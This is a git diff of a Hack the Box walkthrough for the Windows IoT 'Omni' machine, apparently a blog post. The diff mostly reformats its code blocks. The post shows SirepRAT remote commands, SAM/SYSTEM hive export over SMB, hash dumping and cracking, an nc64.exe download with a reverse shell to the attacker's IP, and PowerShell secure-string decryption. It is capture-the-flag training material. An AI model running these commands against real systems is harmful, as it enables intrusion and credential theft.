@@ -9,14 +9,14 @@ header:
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
-  - hackthebox
-  - windows
+  - Hack the Box
+  - Windows
 tags:  
-  - hackthebox
-  - windows
-  - windows iot
-  - sireprat
-  - powershell secure strings
+  - Hack the Box
+  - Windows
+  - Windows IoT
+  - SirepRAT
+  - Powershell Secure Strings
   - secretsdump.py
 ---
 
@@ -28,7 +28,9 @@ Omni is an easy rated machine running Windows IoT Core. We will identify the OS 
 ## Port Scan
 Let's start by scanning for open TCP ports using the following nmap command.
 
-```nmap -sCTV -Pn -T4 -p- -oA nmap_all_tcp 10.10.10.204```
+``` bash
+nmap -sCTV -Pn -T4 -p- -oA nmap_all_tcp 10.10.10.204
+```
 
 ![](/assets/images/htb-omni/01_omni_nmap_scan.png)
 
@@ -55,7 +57,9 @@ Let’s start by cloning the repository into our working directory. As suggested
 
 Okay, let’s start by seeing if this exploit is going to work by simply trying to grab a file. Using the readme page’s example, let’s run the following command from the repository directory.
 
-```python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v```
+``` bash
+python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v
+```
 
 ![](/assets/images/htb-omni/03_omni_sireprat_test.png)
 
@@ -63,7 +67,9 @@ Success! Running this command has returned the hosts file from the machine. The 
 
 Before moving forward be sure to read the usage information on the repository Readme so that you have a comfortable understanding of the commands that you will need to run. You might look at this information and think that you will be able to just quickly upload a file with the `PutFileOnDevice` function. However, even though this is being called an Upload in the documentation, it is actually just writing a file to the specified directory and putting the specified data in the file. There may be a couple of ways that we could use this function to create a small shell payload on the machine. However, this script should be running as the system user. This means that we should have access to the `SAM` and `SYSTEM` files in `C:\Windows\System32\config`. We can confirm this by using the `LaunchCommandWithOutput` function of the script to run a `dir` on the directory using the following command.
 
-```python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c dir C:\windows\system32\config" --v```
+``` bash
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c dir C:\windows\system32\config" --v
+```
 
 ![](/assets/images/htb-omni/04_omni_sireprat_dir_config.png)
 
@@ -71,13 +77,17 @@ It appears that we do indeed see the SAM and SYSTEM files. Now if we can copy th
 
 Kali comes preinstalled with the Samba service. If you do not already have this configured or are not familiar with out to use it, you can start [here](https://blackhatinside.wordpress.com/2016/04/03/kali-linux-2-0-install-configure-samba-server-for-file-sharing/). I already have mine configured to open a public share named "share" on my machine that points to /tmp/share. And so I will just run the following command to make sure it is running, this will simply restart it if it is.
 
-```service smbd restart```
+``` bash
+service smbd restart
+```
 
 Alternatively, you may be able to use Impacket's smbserver.py if you are more familiar with this.
 
 Now we can attempt to copy the SYSTEM file to our machine using the following command.
 
-```python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c copy C:\windows\system32\config\SYSTEM \\\\<YOUR TUNNEL IP>\\share\\SYSTEM" --v```
+``` bash
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c copy C:\windows\system32\config\SYSTEM \\\\<YOUR TUNNEL IP>\\share\\SYSTEM" --v
+```
 
 ![](/assets/images/htb-omni/06_omni_attempt_system_copy.png)
 
@@ -85,36 +95,48 @@ Well darn! That didn’t work. It seems that we are being blocked from copying i
 
 Another option that we have is to export a copy of these files directly from the Windows registry into another folder where we should then be able to copy it to our machine. Let’s try to export the SYSTEM to the `C:\windows\temp` directory using the following command.
 
-```python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c reg save HKLM\SYSTEM C:\windows\temp\SYSTEM" --v```
+``` bash
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c reg save HKLM\SYSTEM C:\windows\temp\SYSTEM" --v
+```
 
 ![](/assets/images/htb-omni/07_omni_export_system.png)
 
 Great! We were able to export the SYSTEM and now we need to do the same for the SAM file using the following command.
 
-```python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c reg save HKLM\SAM C:\windows\temp\SAM" --v```
+``` bash
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c reg save HKLM\SAM C:\windows\temp\SAM" --v
+```
 
 We can then just confirm that the files were exported by running a `dir` on the `C:\windows\temp` directory using the following command.
 
-```python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c dir C:\windows\temp" --v```
+``` bash
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c dir C:\windows\temp" --v
+```
 
 ![](/assets/images/htb-omni/08_omni_dir_temp.png)
 
 Great! So, we have now exported these files into a location where there should not be any other processes locking them. Now we just need to run a similar command that we tried above to copy these files to our attacking machine over SMB. Let's first copy the SYSTEM file with the following command.
 
-```python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c copy C:\windows\temp\SYSTEM \\\\<YOUR TUNNEL IP>\\share\\SYSTEM" --v```
+``` bash
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c copy C:\windows\temp\SYSTEM \\\\<YOUR TUNNEL IP>\\share\\SYSTEM" --v
+```
 
 ![](/assets/images/htb-omni/09_omni_copy_system.png)
 
 Success, now we have the SYSTEM file copied to our attack machine. We can do the same for the SAM file using the following command.
 
-```python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c copy C:\windows\temp\SAM \\\\<YOUR TUNNEL IP>\\share\\SAM" --v```
+``` bash
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c copy C:\windows\temp\SAM \\\\<YOUR TUNNEL IP>\\share\\SAM" --v
+```
 
 This should have resulted in having the SAM and SYSTEM files in your SMB share on your attack machine. Now we need to try to crack the windows system passwords in these files.
 
 ## Dumping and Cracking the Hashes
 We can now use the `secretsdumnp.py` script that is part of [Impacket](https://github.com/SecureAuthCorp/impacket). Kali machines have this installed in the default image. Navigate to the SMB share directory where the SAM and SYSTEM files were saved and then run the following command to dump the hashes.
 
-```secretsdump.py -sam ./SAM -system ./SYSTEM LOCAL```
+``` bash
+secretsdump.py -sam ./SAM -system ./SYSTEM LOCAL
+```
 
 ![](/assets/images/htb-omni/10_omni_hash_dump.png)
 
@@ -130,7 +152,9 @@ aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95
 
 Now we should be able to use the following JohnTheRipper command to crack the hashes using the rockyou work list. This comes on Kali the default kali image in a compressed format. If you haven’t already, you may need to extract it.
 
-```john --fork=4 --format=nt hashes --wordlist=/usr/share/wordlists/rockyou.txt```
+``` bash
+john --fork=4 --format=nt hashes --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
 ![](/assets/images/htb-omni/11_omni_john.png)
 
@@ -160,23 +184,31 @@ It's likely that we can use this web shell to find the flag, and to brows the sy
 
 We can do this by first downloading or moving the nc64.exe executable to our working directory. We can then start a python3 web serve on port 80 within our working directory by running the following command.
 
-```python3 -m http.server 80```
+``` bash
+python3 -m http.server 80
+```
 
 ![](/assets/images/htb-omni/15_omni_web_server.png)
 
 Now from the Device Portal, we will run the following command to use PowerShell on the machine to download our nc64.exe executable and to store it in `C:\Windows\System32\spool\drivers\color\`, a writable and rarely viewed directory.
 
-```powershell Invoke-WebRequest -OutFile C:\Windows\System32\spool\drivers\color\nc64.exe -Uri http://<YOUR TUNNEL IP>/nc64.exe```
+``` bash
+powershell Invoke-WebRequest -OutFile C:\Windows\System32\spool\drivers\color\nc64.exe -Uri http://<YOUR TUNNEL IP>/nc64.exe
+```
 
 ![](/assets/images/htb-omni/16_omni_nc_upload.png)
 
 You can confirm that the file uploaded successfully by running a dir on the directory. If so, we will now need to start a Netcat listener on our attacking machine. Run the following command to start the listener on port 443.
 
-```nc -lvnp 443```
+``` bash
+nc -lvnp 443
+```
 
 And now back in the Device Portal, we will run the following command to use nc64.exe to send a reverse shell back to our listener.
 
-```C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd.exe <YOUR TUNNEL IP> 443```
+``` powershell
+C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd.exe <YOUR TUNNEL IP> 443
+```
 
 If this is successful, we should receive a connection back to our listener.
 
@@ -215,7 +247,7 @@ Using the information found in these posts we should be able to put together a s
 
 First let's enter the powershell console by simply entering `powershell` in our interactive shell. Now run the following two commands. This will set a variable of $credential to contents of the user.txt, and then will run the `GetNetworkCrednetial()` method on it, returning the decrypted version of the password element.
 
-```
+``` powershell
 $credential = Import-CliXml -Path C:\Data\Users\app\user.txt
 $credential.GetNetworkCredential().Password
 ```
@@ -255,7 +287,7 @@ Hardening.txt appears to just be the notes of some kind that is describing the c
 
 Well, we have a pretty good idea of how to decrypt this now. And so, we can run through the same process here. We will once again be requesting the "Password" property from the contents of the file using the `GetNetworkCrednetial()` method in PowerShell. From our interactive PowerShell session, run we run the following commands.
 
-```
+``` powershell
 $credential = Import-CliXml -Path C:\Data\Users\app\iot-admin.xml
 $credential.GetNetworkCredential().Password
 ```
@@ -275,7 +307,9 @@ Success, when logging in to the Windows Device Manager using those credentials, 
 
 This means that we can either go through the same process as we did before and get a reverse shell on the machine, or we can simply run through the following process to grab the flag directly from the web shell. Start by running the following command to output the root.txt.
 
-```type C:\Data\Users\administrator\root.txt```
+``` powershell
+type C:\Data\Users\administrator\root.txt
+```
 
 ![](/assets/images/htb-omni/22_omni_admin_ss_flag.png)
 
@@ -300,7 +334,7 @@ And of course, just as before the root flag is in the PS Secure String format an
 
 So far when decrypting these strings, we have done it in an interactive PowerShell session. This allowed us to create a variable that contained the contents of the data to decrypt and then to run a second command to return the decrypted version of the data we wanted. This web shell is not using PowerShell and so it will not recognize these commands as we have used them in the past. And so, if we want to use this shell, we will need to run a PowerShell one-liner to achieve the same thing. In the web shell, we can run the following command to return the decrypted version of the root flag.
 
-```
+``` powershell
 powershell -c "$credential = Import-CliXml -Path C:\Data\Users\administrator\root.txt; $credential.GetNetworkCredential().Password"
 ```
 
